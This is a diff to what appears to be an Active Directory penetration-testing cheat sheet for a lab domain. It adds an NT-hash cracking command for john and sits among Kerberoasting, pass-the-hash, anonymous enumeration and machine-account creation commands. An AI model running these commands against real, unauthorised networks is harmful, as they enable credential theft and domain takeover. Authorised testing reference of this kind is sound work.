@@ -128,6 +128,7 @@ GetUserSPNs.py -outputfile Kerberoastables.txt -dc-ip 192.168.56.101 BREAKING.BA
 GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 -dc-ip 192.168.56.101 BREAKING.BAD/Administrator
 hashcat --status --hash-type 13100 --attack-mode 0 Kerberoastables.txt `fzf-wordlists`
 john --format=krb5tgs --wordlist=`fzf-wordlists` Kerberoastables.txt
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --fork=10 HashToPwn.txt --rules=all
 polenum -u anonymous -p anonymous -d DC01.BREAKING.BAD
 cme smb 192.168.56.101 -u '' -p '' --pass-pol
 addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass '123soleil!' -dc-host DC01 -domain-netbios BREAKING.BAD 'BREAKING.BAD/anonymous:anonymous'
